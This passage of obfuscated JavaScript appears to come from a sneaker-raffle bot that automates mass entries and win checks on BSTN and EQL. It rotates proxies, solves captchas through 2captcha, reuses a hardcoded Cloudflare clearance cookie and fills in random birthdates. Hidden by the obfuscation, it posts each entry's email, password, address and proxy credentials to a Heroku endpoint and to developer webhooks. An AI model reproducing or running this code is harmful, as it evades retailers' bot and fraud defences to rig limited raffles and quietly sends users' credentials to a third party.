                            console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x4209ae != 'yes')
                            var _0x4209ae = '', _0xbccd3d = 0x0;
                        _0x3e9ae7(_0x8af8ff['name'] + '\x20Task\x20' + (_0xc33309 + 0x1) + '\x20/\x20' + _0x52ad7e['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0x29a858 = Math['round'](Math['random']() * (_0x58559c['length'] - 0x1)), _0x1c0031 = _0x58559c[_0x29a858]['split'](':'), _0x2b9ed5;
                        try {
                            _0x2b9ed5 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1c0031[0x0] + ':' + _0x1c0031[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2b9ed5 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1c0031[0x0] + ':' + _0x1c0031[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xd6dbac = await _0x2b9ed5['newPage'](), _0x1c65ac = await _0xd6dbac['target']()['createCDPSession'](), { windowId: _0x5093c7 } = await _0x1c65ac['send']('Browser.getWindowForTarget');
                            await _0xd6dbac['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x43805f = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0xd6dbac['authenticate']({
                                'username': '' + _0x1c0031[0x2],
                                'password': '' + _0x1c0031[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd6dbac['goto']('' + _0x52ad7e[_0xc33309]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x2456fb = await _0xd6dbac['$']('.hcaptcha-box');
                            if (_0x2456fb) {
                                console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xf09eb2(0x2710);
                                const _0x1abb72 = await _0xd6dbac['$']('.hcaptcha-box');
                                if (_0x1abb72)
                                    try {
                                        await _0x1abb72['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0xd6dbac['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x470855 = await _0xd6dbac['$']('.hcaptcha-box');
                                    if (_0x470855)
                                        try {
                                            await _0x470855['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0xd6dbac['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x1c65ac['send']('Browser.setWindowBounds', {
                                'windowId': _0x5093c7,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xf09eb2(0x1388), await _0xd6dbac['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd6dbac['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Logging\x20in'), await _0xd6dbac['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x24b7b9 => _0x24b7b9['click']()), await _0xd6dbac['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd6dbac['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xf09eb2(0x7d0), await _0xd6dbac['waitForSelector']('#email-login'), await _0xd6dbac['type']('#email-login', '' + _0x52ad7e[_0xc33309]['Email']), await _0xf09eb2(0xdac), await _0xd6dbac['waitForSelector']('#password'), await _0xd6dbac['type']('#password', '' + _0x52ad7e[_0xc33309]['Password'], { 'delay': 0xe6 }), await _0xf09eb2(0x157c);
                            try {
                                await _0xd6dbac['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x7df04a => _0x7df04a['click']());
                            } catch {
                            }
                            try {
                                await _0xd6dbac['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x44a196) {
                            }
                            await _0xf09eb2(0x3e8);
                            const _0x805c82 = await _0xd6dbac['$']('.enteredDraw_container__2KmQ_');
                            if (_0x805c82)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x52ad7e[_0xc33309]['Size']);
                            try {
                                if (_0x52ad7e[_0xc33309]['Size'] != 'RANDOM') {
                                    var _0x4aada3 = _0x52ad7e[_0xc33309]['Size']['replace']('.', ',');
                                    const _0x462501 = await _0xd6dbac['$x']('//div[contains(text(),\x20' + _0x4aada3 + ')]');
                                    await _0x462501[0x0]['click']();
                                } else {
                                    const _0x5809ea = await _0xd6dbac['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x50c646 = Math['round'](Math['random']() * (_0x5809ea['length'] - 0x1));
                                    await _0x5809ea[_0x50c646]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0xf09eb2(0x1f4);
                            const _0x3f1178 = await _0xd6dbac['$']('.addressList_addressItem__LE2PB');
                            if (_0x3f1178 && _0x52ad7e[_0xc33309]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Filling\x20Address'), await _0xd6dbac['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xf09eb2(0x5dc), await _0xd6dbac['waitForSelector']('#firstname'), await _0xd6dbac['type']('#firstname', '' + _0x52ad7e[_0xc33309]['FirstName']), await _0xf09eb2(0x1f4), await _0xd6dbac['waitForSelector']('#firstname'), await _0xd6dbac['type']('#lastname', '' + _0x52ad7e[_0xc33309]['LastName']), await _0xf09eb2(0x1f4), await _0xd6dbac['waitForSelector']('#firstname'), await _0xd6dbac['type']('#street', '' + _0x52ad7e[_0xc33309]['Address1']), await _0xf09eb2(0x1f4), await _0xd6dbac['waitForSelector']('#firstname'), await _0xd6dbac['type']('#houseNumber', _0x52ad7e[_0xc33309]['HouseNumber'] + '\x20' + _0x52ad7e[_0xc33309]['Address2']), await _0xf09eb2(0x1f4), await _0xd6dbac['waitForSelector']('#firstname'), await _0xd6dbac['select']('#country_code', '' + _0x52ad7e[_0xc33309]['Country']), await _0xf09eb2(0x1f4), await _0xd6dbac['type']('#postcode', '' + _0x52ad7e[_0xc33309]['Zip']), await _0xf09eb2(0x1f4), await _0xd6dbac['type']('#city', '' + _0x52ad7e[_0xc33309]['City']), await _0xf09eb2(0x1f4), await _0xd6dbac['type']('#telephone', '' + _0x52ad7e[_0xc33309]['Phone']), await _0xf09eb2(0x1f4), await _0xd6dbac['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xf09eb2(0x9c4);
                            try {
                                await _0xd6dbac['type']('#instagram_name', '' + _0x52ad7e[_0xc33309]['Follower']), await _0xd6dbac['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xf09eb2(0x5dc);
                            try {
                                await _0xd6dbac['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xf09eb2(0x5dc), await _0xd6dbac['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x290e68 => _0x290e68['click']()), await _0xf09eb2(0x1388);
                            try {
                                await _0xd6dbac['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0xd6dbac['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x52ad7e[_0xc33309]['Size'] != 'RANDOM') {
                                    var _0x4aada3 = _0x52ad7e[_0xc33309]['Size']['replace']('.', ',');
                                    const _0x170784 = await _0xd6dbac['$x']('//div[contains(text(),\x20' + _0x4aada3 + ')]');
                                    await _0x170784[0x0]['click']();
                                } else {
                                    const _0x1051c7 = await _0xd6dbac['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x50c646 = Math['round'](Math['random']() * (_0x1051c7['length'] - 0x1));
                                    await _0x1051c7[_0x50c646]['click']();
                                }
                                await _0xf09eb2(0x5dc);
                                try {
                                    await _0xd6dbac['hover']('#instagram_name'), await _0xd6dbac['type']('#instagram_name', '' + _0x52ad7e[_0xc33309]['Follower']), await _0xd6dbac['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Retrying\x20(' + _0xbccd3d + '\x20/\x205)');
                                try {
                                    await _0xd6dbac['hover']('.checkBox_boxHolder__wLGVe'), await _0xf09eb2(0x5dc), await _0xd6dbac['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xf09eb2(0x157c), await _0xd6dbac['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x26af85 => _0x26af85['click']()), await _0xf09eb2(0x1388), await _0xd6dbac['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x4209ae = 'no', _0x3ed4cd(_0x52ad7e[_0xc33309], _0x8af8ff);
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x4b847e),
                                    'proxy': '' + _0x58559c[_0xc33309]
                                };
                                var _0x290ab3 = JSON['stringify'](prxdata);
                                let _0x25dfe1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x290ab3, _0x25dfe1);
                            } catch (_0x23d8b5) {
                            }
                            console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x3c0273 = await _0x22cd2f(_0x52ad7e[_0xc33309], _0x8af8ff, 'dev', ![]), _0x5f0fbc = await _0x22cd2f(_0x52ad7e[_0xc33309], _0x8af8ff, 'pub', ![]);
                            const _0x4e5c35 = {
                                'succesDEVMSG': { 'embeds': [_0x3c0273] },
                                'succesPUBMSG': { 'embeds': [_0x5f0fbc] }
                            };
                            let _0x4b847e = _0x52ad7e[_0xc33309];
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0x8af8ff['name'],
                                    'entrydata': JSON['stringify'](_0x4b847e),
                                    'proxy': '' + _0x58559c[_0xc33309]
                                };
                                var _0x290ab3 = JSON['stringify'](prxdata);
                                let _0x188549 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x290ab3, _0x188549);
                            } catch (_0x31d0d2) {
                            }
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x4e5c35['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x4e5c35['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x4e5c35['succesPUBMSG']);
                            } catch (_0x486843) {
                                console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x486843));
                            }
                        } catch (_0x23406f) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20' + _0x23406f)), _0x4209ae = 'yes', _0x3f63ca = '' + _0x23406f;
                            var _0x337747 = await _0x22cd2f(_0x52ad7e[_0xc33309], _0x8af8ff, 'dev', !![], _0x3f63ca), _0x3c0273 = await _0x22cd2f(_0x52ad7e[_0xc33309], _0x8af8ff, 'dev', ![]), _0x5f0fbc = await _0x22cd2f(_0x52ad7e[_0xc33309], _0x8af8ff, 'pub', ![]);
                            const _0x3bb39a = {
                                'succesDEVMSG': { 'embeds': [_0x3c0273] },
                                'succesPUBMSG': { 'embeds': [_0x5f0fbc] }
                            };
                            _0x3bb39a['errorDEV'] = { 'embeds': [_0x337747] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3bb39a['errorDEV']), await _0x58a176(_0x45f55a, _0x3bb39a['errorDEV']);
                        } finally {
                            _0x2b9ed5['close']();
                            if (_0x4209ae == 'yes' && _0xbccd3d != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Task\x20' + (_0xc33309 + 0x1) + '\x20:\x20Retrying\x20(' + _0xbccd3d + '\x20/\x205)')), _0xc33309 = _0xc33309 - 0x1, _0xbccd3d = _0xbccd3d + 0x1;
                                continue;
                            }
                            _0x4209ae == 'yes' && _0xbccd3d >= 0x5 && (_0x3f94a0(_0x52ad7e[_0xc33309], _0x8af8ff), _0x4209ae = 'no', _0xbccd3d = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x8af8ff['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x131c31, _0x41ff47) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x4f8779;
                    try {
                        const _0x23287f = _0x4b4581['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x4f8779 = _0x57f724['parse'](_0x23287f, { 'header': !![] })['data'];
                    } catch (_0x1941f6) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x31a8d8 = 0x0; _0x31a8d8 < _0x4f8779['length']; _0x31a8d8++) {
                        if (_0x310e40 != 'yes')
                            var _0x310e40 = '', _0x5d51df = 0x0;
                        var _0x2937ff;
                        _0x3e9ae7(_0x131c31['name'] + '\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20/\x20' + _0x4f8779['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0x11654d = await _0x22cd2f(_0x4f8779[_0x31a8d8], _0x131c31, 'acc', ![]);
                        const _0x453df9 = { 'succesDEVMSG': { 'embeds': [_0x11654d] } }, _0x860af0 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x1eaf87 = Math['round'](Math['random']() * (_0x41ff47['length'] - 0x1)), _0x36c0f6 = _0x41ff47[_0x1eaf87]['split'](':'), _0x2b7a1e;
                        try {
                            _0x2b7a1e = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36c0f6[0x0] + ':' + _0x36c0f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2b7a1e = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36c0f6[0x0] + ':' + _0x36c0f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9702f8 = await _0x2b7a1e['newPage']();
                            await _0x9702f8['authenticate']({
                                'username': '' + _0x36c0f6[0x2],
                                'password': '' + _0x36c0f6[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9702f8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x9702f8['setRequestInterception'](!![]), _0x9702f8['on']('request', _0x1ebab7 => {
                                _0x1ebab7['resourceType']() === 'image' ? _0x1ebab7['abort']() : _0x1ebab7['continue']();
                            });
                            try {
                                await _0x9702f8['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x9702f8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x310e40 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x9702f8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xf09eb2(0x3e8), await _0x9702f8['type']('#email', _0x4f8779[_0x31a8d8]['Email']), await _0xf09eb2(0x1f4), await _0x9702f8['type']('#pass', _0x4f8779[_0x31a8d8]['Password']), await _0xf09eb2(0x1f4), await _0x9702f8['$eval']('#login-form', _0x3bd18e => _0x3bd18e['submit']());
                            try {
                                await _0x9702f8['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0xf09eb2(0x190);
                            const _0x3b5dd9 = await _0x9702f8['evaluate'](() => {
                                const _0x90999 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x90999['map'](_0x23be22 => _0x23be22['alt']);
                            }), _0x58570e = await _0x9702f8['evaluate'](() => {
                                const _0x33b71f = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x33b71f['map'](_0x5a887c => _0x5a887c['innerHTML']);
                            }), _0x217ffa = await _0x9702f8['$$']('.raffle-winner');
                            if (_0x217ffa['length'] < 0x1) {
                                console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x310e40 = 'no';
                                continue;
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20' + _0x217ffa['length'] + '\x20Wins\x20Found!');
                            for (var _0x3a6e3c = 0x0; _0x3a6e3c < _0x217ffa['length']; _0x3a6e3c++) {
                                console['log'](_0x4f1d86['green'](_0x3b5dd9[_0x3a6e3c] + _0x58570e[_0x3a6e3c]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x506b9c) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20' + _0x506b9c)), _0x2937ff = '' + _0x506b9c;
                            var _0x4ed077 = await _0x22cd2f(_0x4f8779[_0x31a8d8], _0x131c31, 'acc', !![], _0x2937ff);
                            _0x453df9['errorDEV'] = { 'embeds': [_0x4ed077] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x453df9['errorDEV']), await _0x58a176(_0x45f55a, _0x453df9['errorDEV']), _0x310e40 = 'yes';
                        } finally {
                            if (_0x2b7a1e)
                                _0x2b7a1e['close']();
                            if (_0x310e40 == 'yes' && _0x5d51df != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Task\x20' + (_0x31a8d8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d51df + '\x20/\x205)')), _0x31a8d8 = _0x31a8d8 - 0x1, _0x5d51df = _0x5d51df + 0x1;
                                continue;
                            }
                            _0x310e40 == 'yes' && _0x5d51df >= 0x5 && (_0x3f94a0(_0x4f8779[_0x31a8d8], _0x131c31), _0x310e40 = 'no', _0x5d51df = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x131c31['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x8e7b26, _0x410ffb, _0x3bb9b6) {
                _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1940dd['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x427b01 = 0x0; _0x427b01 < _0x410ffb['length']; _0x427b01++) {
                    var _0x4e2e48;
                    _0x3e9ae7(_0x8e7b26['name'] + '\x20Task\x20' + (_0x427b01 + 0x1) + '\x20/\x20' + _0x410ffb['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                    try {
                        await _0xf6702b(_0x410ffb, _0x427b01);
                    } catch {
                        _0x694acb = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x7f8428(_0x25029f) {
                        const _0x7a2455 = _0x4b4581['readFileSync']('../successful-tasks.csv', 'utf8'), _0x147f3b = _0x57f724['parse'](_0x7a2455, { 'header': !![] })['data'];
                        let _0x499435 = ![];
                        for (var _0x13440a of _0x147f3b) {
                            if (_0x13440a['Url'] == _0x25029f['Url'] && _0x13440a['Email'] == _0x25029f['Email']) {
                                _0x499435 = !![];
                                break;
                            }
                        }
                        return _0x499435;
                    }
                    if (await _0x7f8428(_0x410ffb[_0x427b01]) == !![]) {
                        console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x45ea64 = ![];
                    const _0xf27172 = _0x4b4581['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x1ccf47 = _0x57f724['parse'](_0xf27172, { 'header': !![] })['data'];
                    for (var _0x12f56e of _0x1ccf47) {
                        _0x12f56e['Email'] == _0x410ffb[_0x427b01]['Email'] && (_0x45ea64 = !![]);
                    }
                    if (_0x45ea64 == ![]) {
                        var _0x22e046;
                        if (_0x410ffb[_0x427b01]['Url']['endsWith']('/')) {
                            _0x22e046 = _0x410ffb[_0x427b01]['Url'] + 'register';
                            if (_0x694acb != 'yes')
                                var _0x694acb = '', _0x2af970 = 0x0;
                        } else {
                            _0x22e046 = _0x410ffb[_0x427b01]['Url'] + '/register';
                            if (_0x694acb != 'yes')
                                var _0x694acb = '', _0x2af970 = 0x0;
                        }
                        if (_0x410ffb[_0x427b01]['Email'] == '' || _0x410ffb[_0x427b01]['FirstName'] == '' || _0x410ffb[_0x427b01]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x410ffb[_0x427b01]['Password'] == '' && (_0x410ffb[_0x427b01]['Password'] = 'JRaffles23!');
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x25566c = _0x3bb9b6[_0x427b01]['split'](':');
                        else
                            var _0x1a7ef9 = Math['round'](Math['random']() * (_0x3bb9b6['length'] - 0x1)), _0x25566c = _0x3bb9b6[_0x1a7ef9]['split'](':');
                        var _0x119aeb;
                        try {
                            _0x119aeb = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25566c[0x0] + ':' + _0x25566c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x119aeb = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x25566c[0x0] + ':' + _0x25566c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x130cbd = await _0x119aeb['newPage']();
                            await _0x130cbd['authenticate']({
                                'username': '' + _0x25566c[0x2],
                                'password': '' + _0x25566c[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x130cbd['setRequestInterception'](!![]), _0x130cbd['on']('request', _0x52fb86 => {
                                _0x52fb86['resourceType']() === 'image' || _0x52fb86['resourceType']() === 'font' || _0x52fb86['resourceType']() === 'media' ? _0x52fb86['abort']() : _0x52fb86['continue']();
                            });
                            try {
                                await _0x130cbd['goto']('' + _0x22e046);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xf09eb2(0x3e8), await _0x130cbd['waitForSelector']('#email'), await _0x130cbd['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xf09eb2(0x3e8);
                            try {
                                await _0x130cbd['click']('li[data-value=\x22EU\x20' + _0x410ffb[_0x427b01]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x410ffb[_0x427b01]['Size']);
                            }
                            await _0xf09eb2(0x6a4), await _0x130cbd['type']('#email', '' + _0x410ffb[_0x427b01]['Email']), await _0xf09eb2(0x352), await _0x130cbd['waitForSelector']('#password'), await _0x130cbd['type']('#password', '' + _0x410ffb[_0x427b01]['Password']), await _0xf09eb2(0x352), await _0x130cbd['type']('#phone', '' + _0x410ffb[_0x427b01]['Phone']), await _0xf09eb2(0x352);
                            const _0x35ca21 = await _0x130cbd['$']('#title\x20>\x20label');
                            await _0xf09eb2(0x12c);
                            _0x35ca21 && await _0x35ca21['click']();
                            await _0x130cbd['type']('#firstName', '' + _0x410ffb[_0x427b01]['FirstName']), await _0xf09eb2(0x352), await _0x130cbd['type']('#lastName', '' + _0x410ffb[_0x427b01]['LastName']), await _0xf09eb2(0x352);
                            _0x410ffb[_0x427b01]['Url']['includes']('footlocker.de') ? await _0x130cbd['type']('#birthdate', _0x215f62(0xa, 0x1c) + '.' + _0x215f62(0xa, 0xc) + '.' + _0x215f62(0x7c6, 0x7d3)) : await _0x130cbd['type']('#birthdate', _0x215f62(0xa, 0x1c) + '-' + _0x215f62(0xa, 0xc) + '-' + _0x215f62(0x7c6, 0x7d3));
                            await _0xf09eb2(0x352), await _0x130cbd['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x130cbd['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0xf09eb2(0x1f4), await _0xf09eb2(0x5dc);
                            if (!_0x22e046['includes']('footlocker'))
                                try {
                                    await _0x130cbd['click']('#country');
                                    const _0x102c5f = await _0x130cbd['$']('li[data-value=\x22' + _0x410ffb[_0x427b01]['Country'] + '\x22]');
